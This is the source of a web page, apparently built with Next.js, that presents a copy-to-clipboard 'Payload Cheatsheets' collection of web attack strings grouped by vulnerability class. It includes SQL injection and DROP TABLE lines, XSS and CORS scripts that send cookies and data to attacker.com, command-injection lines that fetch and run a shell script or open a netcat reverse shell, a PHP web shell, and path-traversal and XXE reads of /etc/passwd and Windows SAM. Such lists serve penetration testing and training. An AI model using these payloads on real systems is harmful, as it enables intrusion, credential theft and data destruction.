import { FileCode } from "lucide-react";
import type { Metadata } from "next";
import CheatsheetGrid from "./cheatsheet-grid";

export const metadata: Metadata = {
  title: "Payload Cheatsheets",
  description:
    "Quick-reference payload collections for SQL injection, XSS, path traversal, and more web vulnerabilities.",
};

const cheatsheetData = [
  {
    title: "SQL Injection",
    color: "red",
    payloads: [
      `' OR 1=1 --`,
      `' UNION SELECT NULL, NULL --`,
      `admin' --`,
      `' OR '1'='1`,
      `1' ORDER BY 1 --`,
      `' UNION SELECT username, password FROM users --`,
      `1; DROP TABLE users --`,
      `' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --`,
    ],
  },
  {
    title: "Cross-Site Scripting (XSS)",
    color: "amber",
    payloads: [
      `<script>alert('XSS')</script>`,
      `<img src=x onerror=alert(1)>`,
      `<svg onload=alert(1)>`,
      `javascript:alert(document.cookie)`,
      `"><script>alert(String.fromCharCode(88,83,83))</script>`,
      `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">`,
      `<body onload=alert(1)>`,
      `';alert(1)//`,
    ],
  },
  {
    title: "Path Traversal / LFI",
    color: "emerald",
    payloads: [
      `../../../etc/passwd`,
      `....//....//....//etc/passwd`,
      `..%2f..%2f..%2fetc/passwd`,
      `/proc/self/environ`,
      `php://filter/convert.base64-encode/resource=index.php`,
      `file:///etc/passwd`,
      `..\\..\\..\\windows\\system32\\config\\sam`,
      `/var/log/apache2/access.log`,
    ],
  },
  {
    title: "Command Injection",
    color: "violet",
    payloads: [
      `; ls -la`,
      `| cat /etc/passwd`,
      `\`whoami\``,
      `$(id)`,
      `; curl http://attacker.com/shell.sh | sh`,
      `| nc -e /bin/sh attacker.com 4444`,
      `& ping -c 3 attacker.com &`,
      `%0als`,
    ],
  },
  {
    title: "SSTI (Server-Side Template Injection)",
    color: "cyan",
    payloads: [
      `{{7*7}}`,
      `{{config}}`,
      `{{self.__init__.__globals__}}`,
      `<%= 7*7 %>`,
      `\${7*7}`,
      `{{''.__class__.__mro__[1].__subclasses__()}}`,
      `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
      `#{7*7}`,
    ],
  },
  {
    title: "SSRF (Server-Side Request Forgery)",
    color: "blue",
    payloads: [
      `http://127.0.0.1:80`,
      `http://localhost:22`,
      `http://[::]:80/`,
      `http://0.0.0.0:80`,
      `file:///etc/passwd`,
      `http://169.254.169.254/latest/meta-data/`,
      `gopher://127.0.0.1:25/`,
      `dict://127.0.0.1:11211/`,
    ],
  },
  {
    title: "CSRF (Cross-Site Request Forgery)",
    color: "orange",
    payloads: [
      `<form action="https://target.com/change-email" method="POST"><input type="hidden" name="email" value="attacker@evil.com"><input type="submit"></form>`,
      `<img src="https://target.com/transfer?to=attacker&amount=1000">`,
      `<script>fetch('/api/change-password',{method:'POST',body:'password=hacked',credentials:'include'})</script>`,
      `<form id="csrf" action="/admin/delete-user" method="POST"><input name="username" value="carlos"></form><script>csrf.submit()</script>`,
      `<meta http-equiv="refresh" content="0;url=https://target.com/action?param=value">`,
      `<meta name="referrer" content="no-referrer">`,
    ],
  },
  {
    title: "XXE (XML External Entity)",
    color: "rose",
    payloads: [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
      `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]>`,
      `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
      `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`,
      `Content-Type: application/xml`,
      `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg>&xxe;</svg>`,
    ],
  },
  {
    title: "CORS Misconfiguration",
    color: "teal",
    payloads: [
      `Origin: https://evil.com`,
      `Origin: null`,
      `Origin: https://target.com.evil.com`,
      `Origin: http://target.com`,
      `<script>fetch('https://target.com/api/sensitive',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/log?data='+JSON.stringify(d)))</script>`,
      `<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target.com')</script>"></iframe>`,
    ],
  },
  {
    title: "Access Control / IDOR",
    color: "lime",
    payloads: [
      `/admin`,
      `/robots.txt`,
      `Cookie: Admin=true`,
      `X-Original-URL: /admin`,
      `X-Rewrite-URL: /admin`,
      `{"roleid":2}`,
      `Referer: https://target.com/admin`,
    ],
  },
  {
    title: "File Upload Vulnerabilities",
    color: "sky",
    payloads: [
      `<?php system($_GET['cmd']); ?>`,
      `Content-Type: image/jpeg`,
      `shell.php.jpg`,
      `shell.pHp`,
      `shell.php%00.jpg`,
      `shell.php;.jpg`,
      `AddType application/x-httpd-php .jpg`,
      `exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg`,
    ],
  },
  {
    title: "HTTP Request Smuggling",
    color: "indigo",
    payloads: [
      `Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x`,
      `0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com`,
      `POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG`,
    ],
  },
  {
    title: "JWT (JSON Web Token)",
    color: "pink",
    payloads: [
      `{"alg":"none"}`,
      `{"alg":"HS256"}`,
      `"kid":"../../dev/null"`,
    ],
  },
  {
    title: "Prototype Pollution",
    color: "yellow",
    payloads: [
      `{"__proto__":{"isAdmin":true}}`,
      `{"constructor":{"prototype":{"isAdmin":true}}}`,
      `?__proto__[isAdmin]=true`,
      `?__proto__.isAdmin=true`,
      `{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=attacker.com:1234"}}`,
      `{"__proto__":{"status":510}}`,
    ],
  },
  {
    title: "Clickjacking",
    color: "slate",
    payloads: [
      `<iframe src="https://target.com/sensitive-action" style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>`,
      `<style>iframe{position:relative;width:500px;height:700px;opacity:0.1;z-index:2}</style>`,
      `<iframe sandbox="allow-forms" src="https://target.com/delete-account"></iframe>`,
      `<iframe sandbox="allow-forms allow-scripts" src="https://target.com/action"></iframe>`,
    ],
  },
  {
    title: "Insecure Deserialization",
    color: "emerald",
    payloads: [
      `O:14:"PendingCommand":1:{s:3:"cmd";s:2:"id";}`,
      `java -jar ysoserial.jar CommonsCollections1 'id'`,
    ],
  },
  {
    title: "WebSocket Vulnerabilities",
    color: "purple",
    payloads: [
      `ws://target.com/chat`,
      `<script>var ws=new WebSocket('wss://target.com/chat');ws.onmessage=function(e){fetch('https://attacker.com/?d='+e.data)}</script>`,
      `{"message":"<img src=x onerror=alert(1)>"}`,
    ],
  },
  {
    title: "OAuth / OpenID",
    color: "blue",
    payloads: [
      `redirect_uri=https://attacker.com/callback`,
      `redirect_uri=https://target.com.attacker.com`,
      `response_type=token`,
    ],
  },
  {
    title: "DOM-based Vulnerabilities",
    color: "red",
    payloads: [
      `#<script>alert(1)</script>`,
      `?q=<img src=x onerror=alert(1)>`,
      `javascript:alert(1)`,
      `<iframe src="target" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">`,
      `<a id=someObject><a id=someObject name=url href="//evil.com/pwn.js">`,
    ],
  },
  {
    title: "NoSQL Injection",
    color: "orange",
    payloads: [
      `{"username":{"$ne":""},"password":{"$ne":""}}`,
      `{"username":"admin","password":{"$gt":""}}`,
      `{"username":{"$regex":"^admin"},"password":{"$ne":""}}`,
      `admin'||'1'=='1`,
      `{"$where":"this.username=='admin'"}`,
      `username[$ne]=invalid&password[$ne]=invalid`,
      `{"username":{"$in":["admin","administrator"]}}`,
      `{"$where":"sleep(5000)"}`,
    ],
  },
  {
    title: "HTTP Host Header Attacks",
    color: "rose",
    payloads: [
      `Host: attacker.com`,
      `X-Forwarded-Host: attacker.com`,
      `Host: target.com\r\nHost: attacker.com`,
      `Host: target.com:@attacker.com`,
      `Host: localhost`,
      `Host: 127.0.0.1`,
      `X-Host: attacker.com`,
      `X-Forwarded-Server: attacker.com`,
    ],
  },
  {
    title: "Web Cache Poisoning",
    color: "teal",
    payloads: [
      `X-Forwarded-Host: attacker.com`,
      `X-Forwarded-Scheme: http`,
      `X-Original-URL: /malicious-path`,
      `X-Forwarded-Port: 1234`,
    ],
  },
  {
    title: "Web Cache Deception",
    color: "cyan",
    payloads: [
      `/my-account/nonexistent.css`,
      `/api/user/profile/test.js`,
      `/settings%2F..%2Fstatic/style.css`,
      `/my-account;.css`,
      `/sensitive-page/anything.woff2`,
      `Accept: text/css`,
      `/account/.%2e/static/cached`,
      `/my-account%00.js`,
    ],
  },
  {
    title: "Information Disclosure",
    color: "slate",
    payloads: [
      `/robots.txt`,
      `/.git/HEAD`,
      `/.env`,
      `/backup.zip`,
      `/db.sql`,
      `TRACE / HTTP/1.1`,
      `/phpinfo.php`,
      `/server-status`,
    ],
  },
  {
    title: "GraphQL API",
    color: "fuchsia",
    payloads: [
      `{__schema{types{name}}}`,
      `{__schema{queryType{fields{name}}}}`,
      `{__type(name:"User"){fields{name,type{name}}}}`,
      `query{user(id:1){username,password}}`,
      `mutation{deleteUser(id:1){username}}`,
      `{"query":"query{systemUpdate}","operationName":"systemUpdate"}`,
      `[{"query":"..."},{"query":"..."}]`,
    ],
  },
];

export default function CheatsheetsPage() {
  return (
    <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-10">
      {/* Header */}
      <div className="mb-10">
        <div className="flex items-center gap-3 mb-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-gradient-to-br from-emerald-500 to-teal-500">
            <FileCode className="h-5 w-5 text-white" />
          </div>
          <h1 className="text-3xl font-bold text-slate-100">
            Payload Cheatsheets
          </h1>
        </div>
        <p className="text-slate-500 max-w-2xl">
          Quick-reference payload collections organized by vulnerability type.
          Click &quot;Copy&quot; to copy any payload to your clipboard instantly.
        </p>
      </div>

      <CheatsheetGrid data={cheatsheetData} />
    </div>
  );
}
